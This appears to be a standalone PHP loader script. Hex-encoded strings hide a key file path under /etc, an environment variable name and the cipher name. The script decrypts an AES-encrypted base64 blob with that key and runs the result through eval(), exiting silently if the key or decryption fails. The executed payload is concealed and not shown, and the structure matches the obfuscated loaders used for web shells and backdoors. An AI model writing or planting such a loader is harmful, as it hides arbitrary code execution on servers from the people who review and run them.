<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('i+VM+TXXrPHCjSzzvzRuJg==');

$c=base64_decode(

'DLbHiVDNoPT2I2e7uAxl9p9TBycLXybbtvVGrZPQV4D3dYATS3lO6G4F3jUm81fSTk3EeTYfs2Uh' .
'qmv4WOk7DBPewSaW4ygCqPlbTUe7+78ivlwrzk905ElelS8NXhCcAgD1fqdK9njeL3J6VkWmrU3s' .
'BkjeOj9+9yUSvh74o7gQZLps6FdVLShnvb9Xy0lKMJuiET3dOEk0APDqC6BsG5nfYn9FZ+NAw4e/' .
'PTx49GB0nSZ8Y1TwGjCzg7HMMKLnpvekeGBDmcuTZPk/qL2dCbYX3LgTK5U+DPUSM4K6swQ1JaMN' .
'WZpxM8CnsO2Vtljwxs1+lzt6u2YTSyvusNoD49CBGhl4l0xX/Jq6uUM7RiTnKQwSt+s3pLlnS5Sb' .
'Iq+jN3eY6+M1fT2Y1DqHsOFSmK0w9zgJq9OYjuqsS68g9v0Po/soMZlqLCRsB/5AUZqJ5nyNhaXM' .
'O0RenBT0AiZW8crQ0NEMnCrXH7JgNuAlQzNe4ZFT5sS3bbm5NKrtvZnXqua1Qt8WTdRUKgJqzjrM' .
'trFVYFdmAsRvaKhfNu7DovDCSsS+XhRHm2nq33MsebpoBX3mrC4oFu55WIaby1TipGEgi+l1HT1F' .
'YW2H2C6E6h30Nxv3nGGWsOZ7q3637/V5R1z8VkTgeA1U78lohJkhZFZyZtY+arh2+0jO+qWvpEAT' .
'iFcQdmtMp/pUrq60xmqzCo8gk1hknEijw3pK+CIZTw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

